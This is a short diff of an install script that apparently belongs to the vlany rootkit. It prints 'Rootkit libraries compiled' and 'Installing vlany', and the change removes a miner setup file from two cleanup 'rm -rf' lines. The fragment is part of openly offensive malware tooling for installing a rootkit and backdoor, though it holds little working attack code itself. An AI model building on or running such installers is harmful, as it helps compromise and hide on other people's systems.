@@ -305,7 +305,7 @@ if [ "$1" == "--cli" ]; then
     echo "Rootkit libraries compiled."
     sleep 2
 
-    [ $STATUS == "compile" ] && { rm -rf *.o bashrc shell_msg bd_readme minerd_setup.py; exit; }
+    [ $STATUS == "compile" ] && { rm -rf *.o bashrc shell_msg bd_readme; exit; }
 
     echo "Installing vlany."
     sleep 1
@@ -362,7 +362,7 @@ else
     sleep 2
 
     if [ $RESPONSE == 1 ]; then
-        rm -rf *.o bashrc shell_msg bd_readme minerd_setup.py
+        rm -rf *.o bashrc shell_msg bd_readme
         clear
         exit
     fi
